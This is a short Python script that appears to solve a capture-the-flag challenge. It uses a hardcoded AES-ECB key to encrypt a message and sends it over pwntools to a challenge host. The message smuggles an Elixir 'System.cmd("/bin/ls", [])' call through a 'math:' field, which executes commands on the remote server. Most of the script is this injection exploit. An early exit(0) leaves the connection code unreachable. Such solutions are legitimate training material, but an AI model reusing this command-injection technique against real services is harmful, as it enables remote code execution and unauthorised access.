from Crypto.Cipher import AES
from pwn import *
import base64

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * ' ' 
key = 'yeetyeetyeetyeet'

def dec(msg):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.decrypt(base64.b64decode(msg))

def enc(msg):
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(msg)))

print(dec("wX26EWSyYs+m2A/2spBP6Ej4sV+HaKXVF7Eb18sfMPxafVmxv6jyN8+yje3TLknKWVzI4WxFQm1YPKRxWG9dGag7V2B/Ua7EVwIgqSnr67SJWNs1dek0kIvQDlfHC07g3/uPHiwp+ZyxicZvnwQccndiAfW+zJYPrB+HPKQ00ZFhkFmqKbaZksnO6hE4urovw3apjZHDVfN98vewYvMhkcQCEZ1LJltWsyI6pE1GQzvPZpFMI7EjgnvRZ9g28U1neYeGvGED9vyMiUcC9PeNCw=="))
exit(0)

#while True:
conn = remote('challenges.fbctf.com', 4001)
cipher = AES.new(key, AES.MODE_ECB)
#msg = base64.b64encode(cipher.encrypt(pad('math:')))
#print('Msg = ', msg)
conn.send(enc('134244234:math:"System.cmd(\"/bin/ls\", [])"'))
result = conn.recvall().split(' ')
for x in result:
    dec = cipher.decrypt(base64.b64decode(x))
    print(dec)

